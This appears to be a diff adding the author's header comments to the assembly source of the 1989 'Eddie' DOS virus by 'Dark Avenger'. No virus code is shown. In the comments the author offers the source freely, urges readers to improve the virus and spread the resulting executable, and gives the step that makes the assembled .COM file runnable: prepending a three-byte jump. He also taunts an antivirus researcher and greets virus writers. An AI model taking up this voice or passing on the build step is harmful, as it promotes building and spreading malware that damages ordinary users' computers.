@@ -1,0 +1,40 @@
+;************************
+;*                      *
+;*      E D D I E       *
+;*                      *
+;*   by  Dark Avenger   *
+;*                      *
+;*      3-JAN-1989      *
+;*                      *
+;*     version 1.31x    *
+;*                      *
+;************************
+ 
+; "Blessed is he who expects nothing, for he shall not be disappointed."
+ 
+; The original source of one of the first Bulgarian viruses is in front of
+; you.  As you may notice, it's full of rubbish and bugs, but nevertheless
+; the virus has spread surprisingly quickly throughout the country and made a
+; quick round the globe.  (It's well-known in Eastern and Western Europe, as
+; well as in USA.) Due to the anniversary of its creation, the source is
+; distributed freely.  You have the rights to distribute the source which can
+; be charged or free of charge, with the only condition not to modify it.
+; The one who intentionally distributes this source modified in any way will
+; be punished!  Still, the author will be glad if any of you improves it and
+; spreads the resulting executive file (i.e., the virus itself).  Pay
+; attention to the fact that after you assemble the source, the resulting
+; .COM file cannot be run.  For that purpose you have to create a three byte
+; file, consisting of the hex numbers 0e9h, 68h, 0 and then to combine the
+; two files.  Don't try to place a JMP at the beginning of the source.
+ 
+; DISCLAIMER: The author does not take any responsability for any damage,
+; either direct or implied, caused by the usage or not of this source or of
+; the resulting code after assembly. No warranty is made about the product
+; functionability or quality.
+ 
+; I cannot resist to express my special gratitude to my "populizer" Dipl.
+; eng. Vesselin Bontchev, who makes me famous and who, wishing it or
+; not, helps very much in the spreading of my viruses, in spite of the fact
+; that he tries to do just the opposite (writing programs in C has never
+; led to any good).
+; Greetings to all virus writers!
